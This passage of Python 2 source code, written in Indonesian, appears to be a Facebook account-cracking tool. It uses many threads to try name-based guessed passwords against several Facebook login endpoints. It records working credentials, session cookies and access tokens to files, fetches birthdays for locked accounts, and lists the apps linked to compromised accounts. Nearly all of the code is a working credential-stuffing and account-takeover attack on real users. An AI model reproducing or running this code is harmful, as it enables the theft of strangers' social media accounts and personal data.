                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.b_api, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        elif suuu in ('2', '02'):
            print '\n%s[%s\xe2\x80\xa2%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (N, O, N, H, N, H, ha, op, ta)
            jeda(0.2)
            print '%s[%s\xe2\x80\xa2%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n' % (N, O, N, K, N, K, ha, op, ta)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        elif suuu in ('3', '03'):
            print '\n%s[%s\xe2\x80\xa2%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (N, O, N, H, N, H, ha, op, ta)
            jeda(0.2)
            print '%s[%s\xe2\x80\xa2%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n' % (N, O, N, K, N, K, ha, op, ta)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.mobil, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        else:
            print '%s [%s!%s] isi yang bener kntod' % (p, m, p)
            menu()

    def b_api(self, user, coli):
        global cp
        global loop
        global ok
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in coli:
            pw = pw.lower()
            ses = requests.Session()
            header = {'user-agent': ua, 'x-fb-connection-bandwidth': str(random.randint(20000, 40000)), 
               'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            bapi = 'https://b-api.facebook.com/method/auth.login'
            response = ses.get(bapi + '?format=json&email=' + user + '&password=' + pw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
                loop += 1
                print '\r\x1b[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik',
                sys.stdout.flush()
                b_api(self, user, coli)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r%s*--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s ' % (H, user, pw, response.json()['access_token'])
                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, response.json()['access_token']))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    toket = open('xnxcode.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s*--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s  ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r%s*--> %s \xe2\x80\xa2 %s           ' % (h, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue

        loop += 1
        _random_ = random.choice(['\x1b[1;91m', '\x1b[1;92m'])
        for i in list('\\|-*'):
            print '\r[%s%s%s] %s[crack] %s/%s [OK-:%s]-[CP-:%s]' % (_random_, i, N, N, loop, len(self.id), len(ok), len(cp)),
            sys.stdout.flush()

    def basic(self, user, _Nufikha_Cantik_):
        global loop
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in _Nufikha_Cantik_:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for _fika_ in b('input'):
                if _fika_.get('value') is None:
                    if _fika_.get('name') == 'email':
                        data.update({'email': user})
                    elif _fika_.get('name') == 'pass':
                        data.update({'pass': pw})
                    else:
                        data.update({_fika_.get('name'): ''})
                else:
                    data.update({_fika_.get('name'): _fika_.get('value')})

            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
               '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s*--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s  ' % (O, user, pw, kuki)
                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, kuki))
                cek_apk(coki)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    toket = open('xnxcode.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s*--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r%s*--> %s \xe2\x80\xa2 %s            ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue

        loop += 1
        _random_ = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        for i in list('\\|-*'):
            print '\r[%s%s%s] [crack] %s/%s [OK-:%s]-[CP-:%s]' % (_random_, i, N, loop, len(self.id), len(ok), len(cp)),
            sys.stdout.flush()

        return

    def mobil(self, user, _KhamdihiGanteng_):
        global loop
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in _KhamdihiGanteng_:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com')
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for _hi_ in b('input'):
                if _hi_.get('value') is None:
                    if _hi_.get('name') == 'email':
                        data.update({'email': user})
                    elif _hi_.get('name') == 'pass':
                        data.update({'pass': pw})
                    else:
                        data.update({_hi_.get('name'): ''})
                else:
                    data.update({_hi_.get('name'): _hi_.get('value')})

            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
               '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s*--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s ' % (O, user, pw, kuki)
                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, kuki))
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    toket = open('xnxcode.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s*--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s*--> %s \xe2\x80\xa2 %s              ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue

        loop += 1
        _memek_ = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        for i in list('\\|-*'):
            print '\r[%s%s%s] %s[crack] %s\\%s [OK-:%s]-[CP-:%s]' % (_memek_, i, N, N, loop, len(self.id), len(ok), len(cp)),
            sys.stdout.flush()

        return

    def __free__(self, user, __dihi__):
        global loop
        for i in list('\\|-/'):
            (
             sys.stdout.write('\r [ %s%s%s ][ \x1b[0;96mCRACK \x1b[0;97m][ \x1b[0;96m%s/%s \x1b[0;97m][ \x1b[0;92mOKE:%s \x1b[0;97m][ \x1b[0;93mCEK:%s \x1b[0;97m]' % (H, i, N, loop, len(self.id), len(ok), len(cp))),)
            sys.stdout.flush()

        for pw in __dihi__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass

            try:
                _kontol = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'free.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://free.facebook.com')
            b = ses.post('https://free.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s*--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s                 %s' % (H, user, pw, coki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s*--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s     %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s*--> %s \xe2\x80\xa2 %s                %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1


def cek_apk(coki):
    hit1, hit2 = (0, 0)
    cek = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies={'cookie': coki}).text
    cek2 = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies={'cookie': coki}).text
    if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
        print '{P}[+] Apk yang terkait:'
        if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
            print '  {N}[+] Apk Aktif :'
            print '   [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.'
        else:
            print '  {N}[+] Apk Aktif :'
            apkAktif = re.findall('\\<span\\ class\\="ca\\ cb"\\>(.*?)<\\/span\\>', str(cek))
            ditambahkan = re.findall('\\<div\\ class\\="cc\\ cd\\ ce"\\>(.*?)<\\/div\\>', str(cek))
            for muncul in apkAktif:
                hit1 += 1
                print '   [{H}{hit1}{N}]. {N}{muncul} -> {H}{ditambahkan[hit2]}{N}'
                hit2 += 1

        if 'Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau.' in cek2:
            print '  {N}[+] Apk kadaluarsa :'
            print '   [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.'
        else:
            hit1, hit2 = (0, 0)
            print '  {N}[+] Apk kadaluarsa :'
            apkKadaluarsa = re.findall('\\<span\\ class\\="ca\\ cb"\\>(.*?)<\\/span\\>', str(cek2))
            kadaluarsa = re.findall('\\<div\\ class\\="cc\\ cd\\ ce"\\>(.*?)<\\/div\\>', str(cek2))
            for muncul in apkKadaluarsa:
                hit1 += 1
                print '   [{H}{hit1}{N}]. {N}{muncul} -> {M}{kadaluarsa[hit2]}{N}'
                hit2 += 1

    else:
        print '\n %s[!] cookies anda kadaluwarsa%s' % (M, N)
        waktu(1)
    print ''


if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()
